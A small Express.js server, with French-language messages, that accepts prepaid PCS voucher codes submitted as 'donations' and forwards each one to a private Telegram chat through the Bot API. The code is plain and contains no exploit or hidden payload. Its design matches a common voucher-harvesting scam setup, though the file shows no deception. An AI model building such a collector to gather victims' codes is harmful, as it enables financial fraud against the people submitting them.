require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/api/send-code', async (req, res) => {
  const { code } = req.body;

  if (!code) {
    return res.status(400).json({ error: 'Code requis' });
  }

  try {
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      return res.status(500).json({ error: 'Configuration Telegram manquante' });
    }

    const message = `Nouvelle recharge PCS reçue\n\nCode: ${code}\n\nBaarakaAllahu fik pour votre soutien`;

    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: telegramChatId,
      text: message
    });

    res.json({ success: true, message: 'Code envoyé avec succès. BaarakaAllahu fik.' });
  } catch (error) {
    console.error('Erreur Telegram:', error.message);
    res.status(500).json({ error: 'Erreur lors de l\'envoi du code' });
  }
});

app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});
